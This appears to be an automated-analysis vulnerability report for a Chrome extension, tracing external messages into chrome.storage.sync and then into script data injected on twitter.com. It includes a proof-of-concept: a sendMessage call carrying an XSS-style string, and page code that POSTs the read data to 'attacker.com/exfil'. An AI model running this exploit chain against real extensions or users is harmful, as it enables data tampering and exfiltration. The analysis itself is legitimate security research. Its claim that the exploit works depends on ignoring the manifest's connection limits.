# CoCo Analysis: dcchomblnephblhkmbclkhdpknehldbn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dcchomblnephblhkmbclkhdpknehldbn/opgen_generated_files/bg.js
Line 997	            users[request.gname] = request.group;
	request.group

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dcchomblnephblhkmbclkhdpknehldbn/opgen_generated_files/bg.js
Line 997	            users[request.gname] = request.group;
	request.gname

**Code:**

```javascript
// Background script - Original extension code (lines 988-1003)
// listener from external sources-- i.e, the filter script that was injected to page
chrome.runtime.onMessageExternal.addListener(
    function(request, sender, sendResponse) {

      if(request.action === 'cache-group'){
        chrome.storage.sync.get('users', function (result) {
            let users = result.users;
            // update the contents of group with cached ids
            users[request.gname] = request.group; // ← attacker-controlled data
            chrome.storage.sync.set({'users': users}); // ← stored to chrome.storage.sync
        });
      }
      sendResponse();
    }
);

// Content script (script.js) - Retrieves and injects stored data into webpage
chrome.storage.sync.get(['users', 'selected'], function (result) {
  if(result.selected.length != 0){
    var display = {};
    for(group of result.selected) {
      display[group] = result.users[group]; // ← poisoned data retrieved
    }
    var s = document.createElement('script');
    s.setAttribute("data", JSON.stringify(display)); // ← injected into webpage
    s.src = chrome.runtime.getURL('filter.js');
    s.onload = function() {
        this.remove();
    };
    (document.head || document.documentElement).appendChild(s); // ← accessible to webpage
  }
});

// Injected script (filter.js) - Attacker can access the poisoned data
let data = document.currentScript.getAttribute('data'); // ← attacker reads poisoned data
var users = JSON.parse(data);
// The webpage now has access to attacker-controlled data
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Step 1: Attacker poisons storage from twitter.com or via another extension
// According to methodology rules, we ignore manifest.json externally_connectable restrictions
chrome.runtime.sendMessage(
  "dcchomblnephblhkmbclkhdpknehldbn",
  {
    action: "cache-group",
    gname: "malicious_group",
    group: {
      unmatched: ["victim_user"],
      matched: {
        names: ["attacker_controlled"],
        ids: ["<script>alert('XSS')</script>", "malicious_payload"]
      }
    }
  },
  function(response) {
    console.log("Storage poisoned successfully");
  }
);

// Step 2: When user visits twitter.com, the content script retrieves poisoned data
// and injects it into the webpage via script element's data attribute

// Step 3: Attacker's webpage code can access the poisoned data
setTimeout(() => {
  // After the extension injects the script, webpage can access it
  let injectedScript = document.querySelector('script[data]');
  if (injectedScript) {
    let stolenData = JSON.parse(injectedScript.getAttribute('data'));
    console.log("Retrieved poisoned data:", stolenData);

    // Exfiltrate to attacker server
    fetch("https://attacker.com/exfil", {
      method: "POST",
      body: JSON.stringify(stolenData)
    });
  }
}, 1000);
```

**Impact:** Complete storage exploitation chain allowing external attackers to: (1) poison chrome.storage.sync via onMessageExternal, (2) have the poisoned data retrieved and injected into twitter.com webpages via content script, (3) access the poisoned data from the webpage through the script element's data attribute. This enables data manipulation attacks where the attacker can control what user groups/filters are applied to the user's Twitter timeline, potentially hiding or showing specific content maliciously. The poisoned data is directly accessible to webpage JavaScript, creating a complete exploitation path from external message → storage → webpage access.
